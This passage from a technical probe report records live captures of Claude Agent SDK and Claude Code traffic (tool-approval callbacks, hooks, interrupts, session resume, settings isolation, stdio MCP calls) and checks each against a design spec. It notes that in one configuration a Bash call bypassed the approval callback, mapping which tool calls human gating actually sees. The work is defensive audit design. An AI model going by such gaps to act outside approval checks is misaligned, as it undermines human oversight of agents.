{"type": "user", "message": {"role": "user", "content": [{"tool_use_id": "toolu_0143BWgWYJE8531p4aCq84rp", "type": "tool_result", "content": "hi", "is_error": false}]}, "parent_tool_use_id": null, "session_id": "38678603-2eef-404b-9504-d92993fb025f", "uuid": "ea8740ca-2ab5-49ef-b180-7d77cbad87e1", "timestamp": "2026-09-14T16:04:28.191Z", "tool_use_result": {"stdout": "hi", "stderr": "", "interrupted": false, "isImage": false, "noOutputExpected": false}}
```

Count (computed, not an excerpt): `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/basic/raw-stream.jsonl` contains exactly 1 `can_use_tool` control_request, for `mcp__shepherd__kill_session`; `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/basic/can-use-tool.jsonl` has 1 line. There is none for `Bash`.

| Configuration | `system/init.tools` | Bash `echo hi` asked for | Evidence |
|---|---|---|---|
| spec block (`basic`) | 32 built-ins + 38 claude.ai connector tools + 5 shepherd | **ran, no `can_use_tool` call**, output `hi` | `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/basic/` |
| + `tools=[]` (`tools_empty`) | 38 connector tools + 5 shepherd | model: "I cannot execute bash commands" | `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/tools_empty/` |
| + `tools=[]`, `strict_mcp_config=True` (`locked`) | 5 shepherd only | same | `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/locked/`, `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/locked-syscli/` (2.1.270) |

**Variants and edge cases:** in `basic`, the model first called `ToolSearch` to load the shepherd tools, because MCP tools are *deferred* when the tool list is large. With `tools=[]` there is no `ToolSearch` and the tools are called directly (`docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/tools_empty/raw-stream.jsonl`).

**Spec alignment:** lines 1540–1543 and 113 do not match reality (see `ClaudeAgentOptions`). The isolation test at line 2193 should assert on `system/init.tools` and `system/init.mcp_servers`, not on the option values.

---

### Python hook callbacks inside the SDK master (`hooks=` → `hook_callback`)

- **Produced by:** Claude Code 2.1.259 (`control_request{subtype:"hook_callback"}`)
- **Consumed by:** a possible `authorize()`/audit placement for the master (§11, lines 1725–1751); SDK docstring recommends PreToolUse for "gate every tool call"; M4
- **Probe:** `master_probe.py locked` (`PreToolUse`, `PostToolUse`, `PostToolUseFailure` registered with `matcher=None`). Re-run: as above
- **Status:** verified live 2026-09-14 (56 hook callbacks)

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/locked/raw-stream.jsonl`; the same `input` objects as the callback saw them are in `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/locked/hooks.jsonl`)

```json
{"type": "control_request", "request_id": "f320ce58-9979-4275-8380-3e37723f049d", "request": {"subtype": "hook_callback", "callback_id": "hook_0", "input": {"session_id": "15014424-acaa-4260-976f-1c7d410304c9", "transcript_path": "/root/.claude/projects/-tmp-shp-sdk-9IOKNs-work-locked/15014424-acaa-4260-976f-1c7d410304c9.jsonl", "cwd": "/tmp/shp-sdk-9IOKNs/work-locked", "prompt_id": "4d869e92-a674-4cba-a091-2ea9014b19db", "permission_mode": "default", "hook_event_name": "PreToolUse", "tool_name": "mcp__shepherd__fleet_summary", "tool_input": {}, "tool_use_id": "toolu_01MAsS4rbdbtGJsAFQKVstgX"}, "tool_use_id": "toolu_01MAsS4rbdbtGJsAFQKVstgX"}}
{"type": "control_request", "...": "...", "request": {"subtype": "hook_callback", "callback_id": "hook_1", "input": {"...": "...", "permission_mode": "default", "hook_event_name": "PostToolUse", "tool_name": "mcp__shepherd__fleet_summary", "tool_input": {}, "tool_response": [{"type": "text", "text": "{\"running\": 2, \"needs_you\": [\"ses_a1\"], \"stopped\": 1}"}], "tool_use_id": "toolu_01MAsS4rbdbtGJsAFQKVstgX", "duration_ms": 16}, "...": "..."}}
{"type": "control_request", "...": "...", "request": {"subtype": "hook_callback", "callback_id": "hook_2", "input": {"...": "...", "permission_mode": "default", "hook_event_name": "PostToolUseFailure", "tool_name": "mcp__shepherd__fail_tool", "tool_input": {"reason": "probe"}, "tool_use_id": "toolu_012FdXhQgMDRg25WPkfmz7iw", "error": "max_children_per_session=5 reached", "is_interrupt": false, "duration_ms": 21}, "...": "..."}}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `request.callback_id` | str | always | `hook_0/1/2` | the ids announced in `initialize` |
| `input.hook_event_name` | str | always | `PreToolUse`, `PostToolUse`, `PostToolUseFailure` | |
| `input.tool_name` | str | always | `mcp__shepherd__fleet_summary`, `Bash`, `ToolSearch` | |
| `input.tool_input` | dict | always | | |
| `input.tool_response` | list | PostToolUse | MCP content list | |
| `input.error`, `input.is_interrupt` | str, bool | PostToolUseFailure | the `isError` text; `false` | an MCP `isError:true` result fires **PostToolUseFailure**, not PostToolUse |
| `input.duration_ms` | int | Post* | 7–21 | |
| `input.session_id`, `transcript_path`, `cwd`, `prompt_id`, `permission_mode`, `tool_use_id` | | always | `permission_mode: "default"` | same common fields as shell hooks |

**Variants and edge cases:** hook callbacks fire for tools that bypass `can_use_tool` (the `basic` Bash call has a PreToolUse `hook_callback` but no `can_use_tool`), so a PreToolUse hook is the only SDK-side interception point that sees every call.

**Spec alignment:** the spec is silent on the master using hooks. The SDK's own docstring points to a PreToolUse hook for "gate every tool call" (`docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/introspect/options-source.txt`).

---

### `interrupt()`: request, receipt, and what the turn looks like afterwards

- **Produced by:** claude-agent-sdk 0.2.152 `ClaudeSDKClient.interrupt() -> None` / Claude Code 2.1.259
- **Consumed by:** §6 `MasterRuntime.interrupt() -> None` (line 448), §11 approvals (line 1747), D31; M4
- **Probe:** `master_probe.py interrupt` (during streaming text) and `interrupt_pending_approval` (while `can_use_tool` blocks). Re-run: as above
- **Status:** partially verified (live 2026-09-14 for an interrupt during streaming text, while idle, and while `can_use_tool` was pending. An interrupt during a running in-process *tool handler* was not provoked)

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/interrupt/raw-stream.jsonl`)

```json
{"type": "control_request", "request_id": "req_2_6b2188ca", "request": {"subtype": "interrupt"}}
{"type": "control_response", "response": {"subtype": "success", "request_id": "req_2_6b2188ca", "response": {"still_queued": []}}}
{"type": "assistant", "message": {"model": "claude-haiku-4-5-20251001", "id": "msg_011Cf3coQy8nNHYY62ewP3xA", "type": "message", "role": "assistant", "content": [{"type": "text", "text": "one\ntwo\nthree\nfour\nfive\nsix\nseven\neight\nnine\nten\neleven\ntwel..."}], "container": null, "stop_reason": null, "stop_sequence": null, "stop_details": null, "usage": {"input_tokens": 10, "cache_creation_input_tokens": 3288, "cache_read_input_tokens": 10196, "cache_creation": {"ephemeral_5m_input_tokens": 0, "ephemeral_1h_input_tokens": 3288}, "output_tokens": 4, "service_tier": "standard", "inference_geo": "not_available"}, "diagnostics": null, "context_management": null}, "...": "...", "session_id": "6438769d-8836-42e2-a469-8b84200d0660", "...": "...", "aborted": true}
{"type": "user", "message": {"role": "user", "content": [{"type": "text", "text": "[Request interrupted by user]"}]}, "parent_tool_use_id": null, "session_id": "6438769d-8836-42e2-a469-8b84200d0660", "uuid": "106c3ad9-83f3-49f0-8e56-341cd6c0bd86", "timestamp": "2026-09-14T16:06:11.779Z"}
```

```text
  "scenario": "interrupt",
...
  "interrupt": {
    "after_stream_events": 25,
    "since_query_s": 7.74,
    "returned": "None",
    "call_s": 0.003
  },
...
  "interrupt_when_idle": {
    "returned": "None"
  },
```

While an approval is pending (full captures: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/interrupt_pending_approval/raw-stream.jsonl`, `can-use-tool.jsonl`):

```json
{"type": "control_request", "request_id": "6b846e87-4806-4ab0-9ec8-07fa202e4806", "request": {"subtype": "can_use_tool", "tool_name": "mcp__shepherd__kill_session", "display_name": "Kill Session", "input": {"id": "ses_slow"}, "permission_suggestions": [{"type": "addRules", "rules": [{"toolName": "mcp__shepherd__kill_session"}], "behavior": "allow", "destination": "localSettings"}], "tool_use_id": "toolu_013kVAXAVbKLKYf9S3ZtMd8F"}}
{"type": "control_request", "request_id": "req_2_a5299970", "request": {"subtype": "interrupt"}}
{"type": "control_cancel_request", "request_id": "6b846e87-4806-4ab0-9ec8-07fa202e4806"}
{"type": "user", "message": {"role": "user", "content": [{"type": "tool_result", "content": "The user doesn't want to proceed with this tool use. The tool use was rejected (eg. if it was a file edit, the new_string was NOT written to the file). STOP wha...", "is_error": true, "tool_use_id": "toolu_013kVAXAVbKLKYf9S3ZtMd8F"}]}, "parent_tool_use_id": null, "session_id": "920f6ed2-84e6-4a36-97e6-470322ac539b", "uuid": "4a5d3b19-b22a-4234-982a-a7f187e5ff3e", "timestamp": "2026-09-14T16:08:45.160Z", "tool_use_result": "User rejected tool use", "tool_result_meta": [{"id": "toolu_013kVAXAVbKLKYf9S3ZtMd8F", "non_execution_kind": "user-rejected"}]}
{"type": "user", "message": {"role": "user", "content": [{"type": "text", "text": "[Request interrupted by user for tool use]"}]}, "parent_tool_use_id": null, "session_id": "920f6ed2-84e6-4a36-97e6-470322ac539b", "uuid": "e4b3744f-a718-4116-a2ff-4145d3da1302", "timestamp": "2026-09-14T16:08:45.162Z"}
```

```json
{"_ts": "2026-09-14T16:08:38.734Z", "phase": "entered", "tool_name": "mcp__shepherd__kill_session", "tool_input": {"id": "ses_slow"}}
{"_ts": "2026-09-14T16:08:45.152Z", "phase": "cancelled", "exc": "CancelledError: "}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| Python return | None | always | `None` | returns in about 3 ms; it does not wait for the turn to end |
| wire request | `{"subtype":"interrupt"}` | always | | |
| wire response `still_queued` | list | always | `[]` | receipt (`interrupt_receipt_v1` capability) |
| `control_cancel_request.request_id` | str | when an approval was pending | the `can_use_tool` request id | the SDK cancels the callback coroutine |
| user notice text | str | always | `[Request interrupted by user]`, `[Request interrupted by user for tool use]` | |
| `result.subtype` / `terminal_reason` | str | always | `error_during_execution` / `aborted_streaming`, `aborted_tools` | `is_error: true` |
| `result.permission_denials[]` | list | pending-approval case | the cancelled call | |

**Variants and edge cases:**
- The client stays usable: the next `query()` on the same `ClaudeSDKClient` answered `AFTER` with the same `session_id`.
- `interrupt()` when idle also returns `None` and the CLI acknowledges it with `still_queued: []` (no error).
- The partially streamed assistant block is delivered with `"aborted": true`.

**Spec alignment:**
- Spec line 448 `interrupt(self) -> None` is aligned (it is `async` in the SDK).
- Spec line 1747 says the approval blocks the turn. Reality adds a behaviour the spec does not handle: an interrupt **cancels the pending `authorize()` coroutine**, so the approval card created at line 1737 must be withdrawn on `CancelledError` or it will outlive the turn (`docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/interrupt_pending_approval/can-use-tool.jsonl`).

---

### `resume` and `fork_session`: session identity and transcript location

- **Produced by:** claude-agent-sdk 0.2.152 → Claude Code 2.1.259 `--resume=<id>` / `--fork-session`
- **Consumed by:** §6 `MasterRuntime.resume(master_session_id)` (line 447) and the paragraph at lines 524–534, §11 `resume=state.master_session_id` (line 1535), §9 `ask()` fork (D13, M3); D30; M4
- **Probe:** `master_probe.py resume`, `resume_other_cwd`. Re-run: as above
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/resume/meta.json`, `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/resume_other_cwd/meta.json`, `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/resume/transcript-e6fed1a4-c0b1-41d6-be36-b445e606c5a1.jsonl`)

```text
  "turns": [
    {
      "label": "turn1",
      "wall_s": 1.8,
      "session_id": "e6fed1a4-c0b1-41d6-be36-b445e606c5a1"
    },
    {
      "label": "resumed",
      "wall_s": 1.58,
      "session_id": "e6fed1a4-c0b1-41d6-be36-b445e606c5a1"
    },
    {
      "label": "forked",
      "wall_s": 1.77,
      "session_id": "081dd12b-fad0-4789-ae46-972b7e977a5e"
    }
  ],
  "first_session_id": "e6fed1a4-c0b1-41d6-be36-b445e606c5a1",
  "resumed_session_id": "e6fed1a4-c0b1-41d6-be36-b445e606c5a1",
  "forked_session_id": "081dd12b-fad0-4789-ae46-972b7e977a5e",
  "transcript_dir": "/root/.claude/projects/-tmp-shp-sdk-9IOKNs-work-resume",
  "transcript_files": [
    "081dd12b-fad0-4789-ae46-972b7e977a5e.jsonl",
    "e6fed1a4-c0b1-41d6-be36-b445e606c5a1.jsonl"
  ],
```

```text
"--fork-session"
"--resume=e6fed1a4-c0b1-41d6-be36-b445e606c5a1"
```

Resume from a different process cwd:

```text
  "turns": [
    {
      "label": "turn1-cwd-a",
      "wall_s": 1.39,
      "session_id": "1285a7ff-ef36-45ac-814f-3e76f9d2c9a3"
    },
    {
      "label": "resume-from-cwd-b",
      "wall_s": 2.67,
      "session_id": "1285a7ff-ef36-45ac-814f-3e76f9d2c9a3"
    }
  ],
  "resume_from_b": {
    "session_id": "1285a7ff-ef36-45ac-814f-3e76f9d2c9a3",
    "result": "MANGO-3",
    "subtype": "success",
    "is_error": false
  },
  "transcript_dirs_after_resume_from_b": {
    "-tmp-shp-sdk-9IOKNs-work-resume-other-cwd-a": [
      "1285a7ff-ef36-45ac-814f-3e76f9d2c9a3.jsonl"
    ]
  },
```

Context the harness injected into the master's own transcript even with `setting_sources=[]` (trimmed; full capture: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/resume/transcript-e6fed1a4-c0b1-41d6-be36-b445e606c5a1.jsonl`):

```json
{"...":"...","attachment":{"type":"deferred_tools_delta","addedNames":["CronCreate","CronDelete","CronList","DesignSync","..."],"addedLines":["CronCreate","CronDelete","CronList","DesignSync","..."],"removedNames":[],"wireHiddenNames":[],"readdedNames":[],"pendingMcpServers":[],"needsAuthMcpServers":["claude.ai Atlassian Rovo","claude.ai Google Drive","claude.ai Notion","claude.ai Slack"],"failedMcpServers":[]},"type":"attachment","...":"...","entrypoint":"sdk-py","...":"...","sessionId":"e6fed1a4-c0b1-41d6-be36-b445e606c5a1","version":"2.1.259","...":"..."}
{"...":"...","attachment":{"type":"skill_listing","content":"- dataviz: Use this skill whenever you are about to create ANY chart, graph, plot, dashboard, or dat...","skillCount":13,"isInitial":true,"names":["dataviz","update-config","keybindings-help","code-review","..."]},"type":"attachment","...":"...","entrypoint":"sdk-py","...":"...","sessionId":"e6fed1a4-c0b1-41d6-be36-b445e606c5a1","version":"2.1.259","...":"..."}
{"...":"...","attachment":{"type":"session_context","context":{"userEmail":"The user's email address is <redacted>. Use it only to identify the user, such as for authorship, at..."}},"type":"attachment","...":"...","entrypoint":"sdk-py","...":"...","sessionId":"e6fed1a4-c0b1-41d6-be36-b445e606c5a1","version":"2.1.259","...":"..."}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| resumed `session_id` | str | always | **same** as the original | the resumed turn remembered `PINEAPPLE-7` |
| forked `session_id` | str | always | **new** uuid | a new transcript file appears next to the original |
| transcript path | path | always | `~/.claude/projects/<cwd with / and _ → ->/<session_id>.jsonl` | |
| cross-cwd resume | — | — | succeeded; appended to the **original** cwd's directory | no directory was created for the new cwd |

**Variants and edge cases:**
- Every resume or fork is a new `claude` subprocess (a new `initialize`, `mcp_message initialize` and `tools/list`), so tools and the system prompt are re-sent on each resume.
- The transcript contains `attachment` entries for `deferred_tools_delta`, `skill_listing`, `session_context.userEmail`, `environment`, `model` and `date`. The master's context therefore contains the account e-mail and a skill list regardless of `setting_sources`.

**Spec alignment:**
- Spec lines 447 and 524–527 (an opaque id; the SDK resumes the transcript Claude Code already wrote; `owns_history=True`) are aligned. There is no `resume()` method: `resume` is a constructor option, so `AgentSDKMaster.resume()` must rebuild the client.
- Spec line 1535 (`resume=state.master_session_id`, which survives daemon restarts) is aligned for the id. It also survived a cwd change in this probe. Survival across a Claude Code upgrade was not tested.

---

### `setting_sources` isolation: what actually reaches the master

- **Produced by:** Claude Code 2.1.259 under `--setting-sources=` / `=project` / (no flag)
- **Consumed by:** §11 line 1528, §14 2b isolation test (lines 2193–2195), §18 risk row (line 2329); D10, D19; M4
- **Probe:** `master_probe.py isolation`: a `CLAUDE.md` in the throwaway cwd saying "end every reply with ZEBRA-MARKER-41". Re-run: as above
- **Status:** partially verified. Project `CLAUDE.md` exclusion was verified live. User-scope `~/.claude/CLAUDE.md` does not exist on this machine and creating one would edit user config. cc10x exclusion is not verifiable here, because the safety rules require disabling it via flag settings in every run.

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/isolation/meta.json`)

```text
      "--setting-sources=",
...
      "--setting-sources=project",
...
  "isolation_results": {
    "setting_sources_empty": "Hello.",
    "setting_sources_project": "Howdy ZEBRA-MARKER-41",
    "setting_sources_none": "Hello.\n\nZEBRA-MARKER-41"
  },
```

```json
{"type": "system", "subtype": "init", "...": "...", "mcp_servers": [{"name": "claude.ai Google Drive", "status": "needs-auth"}, {"name": "claude.ai Slack", "status": "needs-auth"}, {"name": "claude.ai Notion", "status": "needs-auth"}, {"name": "claude.ai Google Calendar", "status": "connected"}, {"name": "claude.ai Atlassian Rovo", "status": "needs-auth"}, {"name": "claude.ai Gmail", "status": "connected"}, {"name": "shepherd", "status": "connected"}], "...": "...", "skills": ["deep-research", "design-sync", "dataviz", "..."], "plugins": [], "...": "...", "memory_paths": {"auto": "/root/.claude/projects/-tmp-shp-sdk-9IOKNs-work-isolation/memory/"}, "...": "..."}
```

| `setting_sources` | argv | project `CLAUDE.md` obeyed? | account connectors mounted? | bundled skills listed? |
|---|---|---|---|---|
| `[]` | `--setting-sources=` | **no** (`Hello.`) | yes (6 `claude.ai …` servers) | yes (17) |
| `["project"]` | `--setting-sources=project` | yes | yes | yes |
| `None` | (flag absent) | yes | yes | yes |

**Variants and edge cases:** the only option that removed the connectors was `strict_mcp_config=True`. Neither `setting_sources` nor `tools=[]` removed skills from `system/init.skills`. `tools=[]` removes the `Skill` tool, so they become unreachable.

**Spec alignment:**
- Spec line 1528 (`# no CLAUDE.md, no cc10x, no skills`) is only partly right. "no CLAUDE.md" holds for project scope. "no skills" is wrong for Claude Code's bundled skills: 17 are listed and a `skill_listing` attachment is injected (the attachment was captured in the `resume` run, which did not set `tools=[]`). "no cc10x" is unverified. Account connectors and the `userEmail` session context also reach the master (`docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/isolation/raw-stream.jsonl`, `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/resume/transcript-*.jsonl`).
- Spec line 2329 (§18) says "do not trust it". That is confirmed: the isolation test needs `tools=[]` + `strict_mcp_config=True` and should assert on `system/init.tools`/`mcp_servers`/`skills`.

---

### Tier-2 stdio MCP: server process launch and environment

- **Produced by:** Claude Code 2.1.270 (`claude -p --mcp-config <file> --strict-mcp-config`)
- **Consumed by:** §11.0 `to_stdio_mcp_server()` / `shepherd-mcp` (line 1480), §11 Two bindings (line 1695), §11 "attributed to the calling session" (line 1619); D20, D32; M4
- **Probe:** `docs/probes/2026-09-14-schemas/agent-sdk-mcp/stdio/run_stdio_probe.sh`. Re-run: `bash docs/probes/2026-09-14-schemas/agent-sdk-mcp/stdio/run_stdio_probe.sh`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/stdio-mcp/mcp-wire.jsonl` (first line), `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/stdio-mcp/meta.txt`, `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/stdio-mcp/mcp.json`)

```text
claude_bin=/root/.local/bin/claude
claude_version=2.1.270 (Claude Code)
tmpdir=/tmp/shp-mcp-AY6vTM
scrubbed=-u CLAUDE_CODE_CHILD_SESSION -u AI_AGENT -u CLAUDE_CODE_SESSION_ID -u CLAUDE_PID -u CLAUDE_EFFORT -u CLAUDE_CODE_MESSAGING_SOCKET -u CLAUDE_CODE_BRIDGE_SESSION_ID -u CLAUDECODE -u CLAUDE_CODE_SESSION_ATTENDED -u CLAUDE_CODE_ENTRYPOINT -u CLAUDE_CODE_EXECPATH -u CLAUDE_CODE_MESSAGING_TOKEN 
started=2026-09-14T16:14:49Z
/root/.local/bin/claude -p $'Do these steps in order, one tool call per step, then reply DONE:\n1. call mcp__probe__echo_note with text="hello" and count=2\n2. call mcp__probe__fail_note with reason="probe"\n3. call mcp__probe__rpc_error_note\n4. call mcp__probe__danger_note with target="x"\n5. call...
exit=0
finished=2026-09-14T16:15:03Z
```

```json
{"_dir": "start", "pid": 4047192, "...": "...", "cwd": "/tmp/shp-mcp-AY6vTM/work", "env_names": ["...", "CLAUDECODE", "CLAUDE_CODE_ENTRYPOINT", "CLAUDE_CODE_MESSAGING_SOCKET", "CLAUDE_CODE_MESSAGING_TOKEN", "CLAUDE_CODE_SESSION_ID", "CLAUDE_PROJECT_DIR", "...", "PROBE_MARKER", "...", "SHP_CLAUDE_VERSION", "..."], "env_values_allowlisted": {"CLAUDE_CODE_SESSION_ID": "b94c6873-915c-45f1-9c53-5e9be3acdc35", "CLAUDE_PROJECT_DIR": "/tmp/shp-mcp-AY6vTM/work", "CLAUDE_CODE_ENTRYPOINT": "sdk-cli", "CLAUDECODE": "1", "PROBE_MARKER": "1", "SHP_CLAUDE_VERSION": "2.1.270 (Claude Code)"}, "secret_env_names_present_values_not_logged": ["CLAUDE_CODE_MESSAGING_TOKEN"], "ancestry": [{"pid": 4047192, "comm": "python3", "ppid": 4047179}, {"pid": 4047179, "comm": "claude", "ppid": 4047178}, {"pid": 4047178, "comm": "timeout", "ppid": 4047177}, {"pid": 4047177, "comm": "bash", "ppid": 4047154}, {"pid": 4047154, "comm": "bash", "ppid": 4047150}, {"pid": 4047150, "comm": "bash", "ppid": 3971404}, {"pid": 3971404, "comm": "claude", "ppid": 3971392}, {"pid": 3971392, "comm": "bash", "ppid": 3971391}, {"pid": 3971391, "comm": "tmux: server", "ppid": 1}]}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| server parent | process | always | `claude` (the session's own pid) | spawned at session start, before the first prompt |
| server `cwd` | path | always | the session's cwd | |
| `CLAUDE_CODE_SESSION_ID` | env str | always | equals the session's `session_id` in `stream.jsonl` | **caller identity for `shepherd-mcp`** |
| `CLAUDE_PROJECT_DIR` | env str | always | session cwd | |
| `CLAUDE_CODE_ENTRYPOINT` | env str | always | `sdk-cli` | for `-p --output-format stream-json` |
| `CLAUDECODE` | env str | always | `1` | |
| `CLAUDE_CODE_MESSAGING_SOCKET`, `CLAUDE_CODE_MESSAGING_TOKEN` | env str | always | values not logged | set by the session, not inherited (the probe scrubbed them) |
| `env` from `mcp.json` | env | always | `PROBE_MARKER=1` | passed through |

**Variants and edge cases:** the full parent environment is inherited as well (39 variable names; `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/stdio-mcp/mcp-wire.jsonl`).

**Spec alignment:** spec line 1619 requires audit entries "attributed to the calling session" but does not say how `shepherd-mcp` learns the caller. Reality: `CLAUDE_CODE_SESSION_ID` in the server's environment is the calling session's id, so one `shepherd-mcp` process per session can attribute every call without trusting tool arguments.

---

### Tier-2 stdio MCP: `initialize` and `tools/list` (JSON-RPC as Claude Code speaks it)

- **Produced by:** Claude Code 2.1.270 (client) / probe server (responses)
- **Consumed by:** §11.0 `to_stdio_mcp_server()` (line 1480), line 1432 ("MCP over stdio is the contract it speaks"); D32; M4
- **Probe:** `docs/probes/2026-09-14-schemas/agent-sdk-mcp/stdio/run_stdio_probe.sh`. Re-run: `bash docs/probes/2026-09-14-schemas/agent-sdk-mcp/stdio/run_stdio_probe.sh`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/stdio-mcp/mcp-wire.jsonl`; `[in ]` = what Claude Code sent, `[out]` = what the server answered, one JSON-RPC message per newline-terminated line)

```json
[in ] {"method":"initialize","params":{"protocolVersion":"2025-11-25","capabilities":{"roots":{"listChanged":true},"elicitation":{}},"clientInfo":{"name":"claude-code","title":"Claude Code","version":"2.1.270","description":"Anthropic's agentic coding tool","websiteUrl":"https://claude.com/claude-code"}},"jsonrpc":"2.0","id":0}
[out] {"jsonrpc": "2.0", "id": 0, "result": {"protocolVersion": "2025-11-25", "capabilities": {"tools": {"listChanged": false}}, "serverInfo": {"name": "probe-logger", "version": "0.0.1"}}}
[in ] {"jsonrpc":"2.0","method":"notifications/initialized"}
[in ] {"method":"tools/list","jsonrpc":"2.0","id":1}
[out] {"jsonrpc": "2.0", "id": 1, "result": {"tools": [{"name": "echo_note", "title": "Echo Note", "description": "Echo a note back. Probe tool.", "inputSchema": {"type": "object", "properties": {"text": {"type": "string", "description": "the note"}, "count": {"type": "integer", "minimum": 1}}, "required": ["text"], "additionalProperties": false}, "annotations": {"readOnlyHint": true}}, {"name": "fail_note", "description": "Always returns a tool-level error result (isError).", "inputSchema": {"type": "object", "properties": {"reason": {"type": "string"}}, "required": ["reason"]}}, {"name": "rpc_error_note", "description": "Always returns a JSON-RPC protocol error.", "inputSchema": {"type": "object", "properties": {}}}, {"name": "danger_note", "description": "A destructive probe tool that is not pre-allowed.", "inputSchema": {"type": "object", "properties": {"target": {"type": "string"}}, "required": ["target"]}, "annotations": {"destructiveHint": true}}]}}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| framing | newline-delimited JSON | always | | compact separators from Claude Code |
| `initialize.params.protocolVersion` | str | always | `2025-11-25` | the server echoed it and was accepted |
| `initialize.params.capabilities` | dict | always | `roots.listChanged: true`, `elicitation: {}` | the in-process SDK path sends `{}` |
| `initialize.params.clientInfo` | dict | always | `name: claude-code`, `version: 2.1.270` | |
| `notifications/initialized` | notification | always | no `id` | |
| `tools/list` params | — | always | none (no cursor) | pagination not exercised |
| `result.tools[]` fields accepted | | always | `name`, `title`, `description`, `inputSchema` (with `additionalProperties`, `minimum`, `description`), `annotations.readOnlyHint`, `annotations.destructiveHint` | all four tools were listed in `system/init.tools` as `mcp__probe__<name>` |

**Variants and edge cases:** `title` and `annotations` did not change how permissions were handled. `danger_note` (`destructiveHint:true`) and `echo_note` (`readOnlyHint:true`) were gated purely by `--allowedTools`.

**Spec alignment:** aligned with line 1432 and D32. The binding is plain MCP over stdio, and the model sees `mcp__<server-key>__<tool>`. The spec's `shepherd-mcp` would be mounted with the key `shepherd`, so tier-2 names are `mcp__shepherd__<tool>`, identical to the master's.

---

### Tier-2 stdio MCP: `tools/call` requests, results, errors, and what the model sees

- **Produced by:** Claude Code 2.1.270 / probe server
- **Consumed by:** §11.0 `invoke()` behind `to_stdio_mcp_server()`, §11 recursion caps ("error the agent can read", line 1722), SESSION_TOOLS (lines 1701–1706); D32; M4
- **Probe:** `docs/probes/2026-09-14-schemas/agent-sdk-mcp/stdio/run_stdio_probe.sh`. Re-run: `bash docs/probes/2026-09-14-schemas/agent-sdk-mcp/stdio/run_stdio_probe.sh`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/stdio-mcp/mcp-wire.jsonl`). The four pairs are: success, `isError` result, JSON-RPC error, and a call missing the required `text`.

```json
[in ] {"method":"tools/call","params":{"name":"echo_note","arguments":{"text":"hello","count":2},"_meta":{"claudecode/toolUseId":"toolu_013516j4ARBNwtSPj9RWtTxG","progressToken":2}},"jsonrpc":"2.0","id":2}
[out] {"jsonrpc": "2.0", "id": 2, "result": {"content": [{"type": "text", "text": "echo: 'hello' count=2"}], "isError": false}}
[in ] {"method":"tools/call","params":{"name":"fail_note","arguments":{"reason":"probe"},"_meta":{"claudecode/toolUseId":"toolu_01FsXNbwyhCiEBnL8GQh2JZG","progressToken":3}},"jsonrpc":"2.0","id":3}
[out] {"jsonrpc": "2.0", "id": 3, "result": {"content": [{"type": "text", "text": "max_session_depth=3 reached; refusing"}], "isError": true}}
[in ] {"method":"tools/call","params":{"name":"rpc_error_note","arguments":{},"_meta":{"claudecode/toolUseId":"toolu_01Ad55LkgJbpQSZDx13o2E7w","progressToken":4}},"jsonrpc":"2.0","id":4}
[out] {"jsonrpc": "2.0", "id": 4, "error": {"code": -32603, "message": "probe internal error"}}
[in ] {"method":"tools/call","params":{"name":"echo_note","arguments":{"count":5},"_meta":{"claudecode/toolUseId":"toolu_01LTSw8eSCWywBV57sUW38kn","progressToken":5}},"jsonrpc":"2.0","id":5}
[out] {"jsonrpc": "2.0", "id": 5, "result": {"content": [{"type": "text", "text": "echo: None count=5"}], "isError": false}}
```

What the session's stream showed for each (trimmed; full capture: `docs/probes/2026-09-14-schemas/agent-sdk-mcp/captures/stdio-mcp/stream.jsonl`). `danger_note` never reached the server:

```json
{"type":"system","subtype":"init","...":"...","tools":["mcp__probe__danger_note","mcp__probe__echo_note","mcp__probe__fail_note","mcp__probe__rpc_error_note"],"mcp_servers":[{"name":"probe","status":"connected"}],"...":"...","apiKeySource":"none","claude_code_version":"2.1.270","...":"..."}
{"type":"user","message":{"role":"user","content":[{"tool_use_id":"toolu_013516j4ARBNwtSPj9RWtTxG","type":"tool_result","content":[{"type":"text","text":"echo: 'hello' count=2"}]}]},"...":"...","tool_use_result":[{"type":"text","text":"echo: 'hello' count=2"}]}
{"type":"user","message":{"role":"user","content":[{"type":"tool_result","content":"max_session_depth=3 reached; refusing","is_error":true,"tool_use_id":"toolu_01FsXNbwyhCiEBnL8GQh2JZG"}]},"...":"...","tool_use_result":"Error: max_session_depth=3 reached; refusing"}
{"type":"user","message":{"role":"user","content":[{"type":"tool_result","content":"probe internal error","is_error":true,"tool_use_id":"toolu_01Ad55LkgJbpQSZDx13o2E7w"}]},"...":"...","tool_use_result":"Error: probe internal error"}
